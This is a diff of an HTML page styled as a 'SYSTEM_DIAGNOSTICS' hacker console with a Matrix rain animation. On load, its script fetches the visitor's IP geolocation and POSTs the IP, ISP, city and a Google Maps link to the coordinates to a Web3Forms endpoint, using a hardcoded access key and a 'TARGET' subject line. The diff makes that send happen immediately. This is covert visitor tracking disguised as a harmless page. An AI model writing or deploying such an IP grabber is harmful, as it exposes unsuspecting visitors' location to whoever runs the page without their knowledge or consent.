@@ -4,30 +4,27 @@
     <title>SYSTEM_DIAGNOSTICS</title>
     <style>
         body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: monospace; }
-        /* This creates the falling letters effect */
-        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.2; }
-        /* This is your terminal box */
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
         #console { 
             position: relative; z-index: 2; max-width: 600px; 
             margin: 50px auto; border: 1px solid #0f0; padding: 20px; 
-            min-height: 400px; background: rgba(0, 5, 0, 0.9); 
-            box-shadow: 0 0 15px #0f0; color: #0f0;
+            min-height: 400px; background: rgba(0, 10, 0, 0.85); 
+            box-shadow: 0 0 20px #0f0; color: #0f0;
         }
-        .line { margin-bottom: 8px; font-size: 14px; }
-        .blue { color: #0cf; }
+        .line { margin-bottom: 8px; font-size: 14px; text-shadow: 0 0 5px #0f0; }
+        .blue { color: #0cf; text-shadow: 0 0 5px #0cf; }
     </style>
 </head>
 <body>
 
 <canvas id="matrix"></canvas>
-<div id="console">> [SYS] BOOTING_CORE_FRMWK...</div>
+<div id="console">> [SYS] BOOTING_CORE_V4...</div>
 
 <script>
-    // --- 1. THE GREEN FALLING CODE (MATRIX) ---
+    // 1. THE MATRIX RAIN
     var canvas = document.getElementById('matrix');
     var ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     var letters = "0101010101ABCDEF".split("");
     var fontSize = 16;
     var columns = canvas.width / fontSize;
@@ -35,10 +32,8 @@
     for (var x = 0; x < columns; x++) drops[x] = 1;
 
     function drawMatrix() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0F0";
-        ctx.font = fontSize + "px monospace";
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
         for (var i = 0; i < drops.length; i++) {
             var text = letters[Math.floor(Math.random() * letters.length)];
             ctx.fillText(text, i * fontSize, drops[i] * fontSize);
@@ -46,9 +41,9 @@
             drops[i]++;
         }
     }
-    setInterval(drawMatrix, 50); // Adjusted speed for stability
+    setInterval(drawMatrix, 50);
 
-    // --- 2. THE TERMINAL LOGIC ---
+    // 2. CONSOLE LOGIC
     var consoleBox = document.getElementById('console');
     function log(text, color) {
         var div = document.createElement('div');
@@ -58,31 +53,29 @@
         consoleBox.appendChild(div);
     }
 
-    // --- 3. THE DATA PULL ---
+    // 3. DATA PULL & SEND
     fetch('https://ipapi.co/json/')
     .then(function(res) { return res.json(); })
     .then(function(data) {
-        setTimeout(function() { log("BYPASSING_ISP_GATEWAY...", "#888"); }, 500);
-        setTimeout(function() { log("TARGET_IP: " + data.ip, "#0cf"); }, 1500);
-        setTimeout(function() { log("LOCATING_NODE: " + data.city, "#0cf"); }, 2500);
-        setTimeout(function() { log("GPS_COORDS: " + data.latitude + ", " + data.longitude, "#0cf"); }, 3500);
-        setTimeout(function() { log("UPLOADING_ENCRYPTED_PACKET...", "#ff0"); }, 4500);
-        setTimeout(function() { log("SCAN_COMPLETE. SESSION_HIDDEN.", "#0f0"); }, 5500);
+        setTimeout(function() { log("BYPASSING_GATEWAY...", "#888"); }, 500);
+        setTimeout(function() { log("IP_FOUND: " + data.ip, "#0cf"); }, 1500);
+        setTimeout(function() { log("ISP: " + data.org, "#0cf"); }, 2500);
+        setTimeout(function() { log("LOCATION: " + data.city, "#0cf"); }, 3500);
+        setTimeout(function() { log("STATUS: UPLOADING_TO_SERVER", "#ff0"); }, 4500);
 
-        // Send to Web3Forms
-        setTimeout(function() {
-            fetch("https://api.web3forms.com/submit", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    access_key: "e5648bbe-21aa-4432-a5bf-e5d1c7d007c6",
-                    subject: "🎯 TARGET_ACQUIRED: " + data.ip,
-                    IP: data.ip,
-                    ISP: data.org,
-                    Map: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
-                })
-            });
-        }, 6000);
+        // THE FORCE SEND
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                access_key: "e5648bbe-21aa-4432-a5bf-e5d1c7d007c6",
+                subject: "🎯 TARGET: " + data.ip,
+                IP: data.ip,
+                ISP: data.org,
+                City: data.city,
+                Maps: "https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
+            })
+        });
     });
 </script>
 </body>
